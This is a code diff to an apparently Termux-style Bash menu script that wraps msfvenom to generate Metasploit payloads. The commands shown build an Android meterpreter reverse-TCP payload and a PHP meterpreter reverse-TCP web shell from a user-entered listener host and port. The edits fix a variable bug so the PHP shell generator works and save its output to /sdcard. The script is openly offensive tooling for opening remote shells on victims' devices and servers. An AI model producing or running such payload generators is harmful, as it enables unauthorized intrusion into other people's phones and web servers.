@@ -122,8 +122,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/
 echo ""
 echo -e $cyan " Done  Now U Can find a Payload in your files"
 echo ""
-read -p "Press Enter Key to continue..."
-readEnterKey
+read -p "Press Enter to continue..."
 bash hacking.sh
 fi
 if [ $Zoal -eq 2 ]
@@ -243,10 +242,10 @@ fi
 if [ $Zoal -eq 14 ]
 then
 echo -e $blue "Please Insert LHOST :>"
-read -p "                    LHOST----->" host
+read -p "                    LHOST----->" lhost
 echo -e $blue "Please Insert PORT :>"
 read -p "                    LPORT----->" lport
-msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/shell.php
 echo ""
 echo -e $blue " Done u can find a shell in your files"
 read -p "Press Enter to continue..."
